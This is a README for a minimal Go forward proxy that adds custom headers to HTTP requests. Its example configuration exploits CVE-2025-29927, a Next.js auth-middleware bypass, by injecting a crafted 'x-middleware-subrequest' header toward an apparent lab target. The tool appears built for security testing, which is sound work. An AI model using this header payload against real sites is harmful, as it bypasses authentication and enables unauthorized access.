# Poor man's forward proxy
[![Go Tests](https://github.com/SaremS/pmfp/actions/workflows/go.yml/badge.svg?branch=master)](https://github.com/SaremS/pmfp/actions/workflows/go.yml)

## Summary
(currently http only)

Forward proxy with minimal features (currently only adds custom headers to each request)
## Usage
Currently
```
go run cmd/main.go --config {config-yaml; see examples} --port {target port to bind proxy to}
```

## Example
### CVE-2025-29927
(Auth-Middleware bypass in Next.JS)

#### Config (see examples):
``
scope:
- type: exact_match
  target_host: 94.237.57.115:54987
request_manipulators:
- type: add_header
  header_name: x-middleware-subrequest
  header_value: "middleware:middleware:middleware:middleware:middleware"
```

#### Result:
![Demo](examples/cve_2025_29927_example.gif)
